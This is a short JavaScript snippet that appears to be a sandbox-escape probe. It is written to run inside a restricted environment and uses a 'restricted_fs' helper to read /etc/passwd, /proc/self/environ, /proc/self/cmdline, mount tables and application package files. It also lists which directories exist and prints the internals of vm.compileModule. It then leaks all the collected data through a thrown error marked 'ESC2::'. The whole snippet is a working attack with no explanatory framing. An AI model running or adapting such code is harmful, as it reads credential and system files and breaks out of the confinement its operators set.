var out = {};
function S(x,n){ try { return String(x).slice(0,n||400); } catch(e){ return "?"; } }
// A. file read via restricted_fs.readFile - try a set of paths
var paths = ["/etc/passwd","/etc/hostname","/proc/self/cmdline","/proc/self/environ","/proc/version","/proc/mounts","/etc/os-release","/proc/self/cwd/package.json","/app/package.json","/workspace/package.json"];
out.readFiles = {};
paths.forEach(function(p){
  try { out.readFiles[p] = S(restricted_fs.readFile(p), 300); } catch(e){ out.readFiles[p] = "ERR:"+S(e,120); }
});
// B. what does exists/isDirectory tell us
out.exists = {};
["/etc","/proc","/proc/self","/app","/workspace","/usr/bin","/bin"].forEach(function(p){
  try { out.exists[p] = String(restricted_fs.exists(p)); } catch(e){ out.exists[p]="ERR"; }
});
// C. vm.compileModule signature
out.vm_compile_str = S(vm.compileModule, 400);
throw new Error("ESC2::" + JSON.stringify(out));
